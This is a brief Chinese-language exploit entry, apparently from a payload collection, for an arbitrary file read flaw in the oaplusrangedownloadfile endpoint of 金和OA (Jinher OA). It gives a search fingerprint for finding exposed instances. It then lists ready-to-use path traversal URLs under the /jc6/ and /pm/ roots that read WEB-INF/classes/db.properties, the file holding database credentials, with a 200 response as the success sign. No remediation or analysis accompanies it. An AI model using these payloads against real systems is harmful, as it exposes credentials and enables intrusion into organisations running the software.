# 金和OAjc6oaplusrangedownloadfile接口存在文件读取漏洞

金和OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/jc6/platform/"`

**Payload**
```
/jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties
看根目录下是 /jc6/ 还是 /pm/
/pm/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties
```
- **响应特征**：200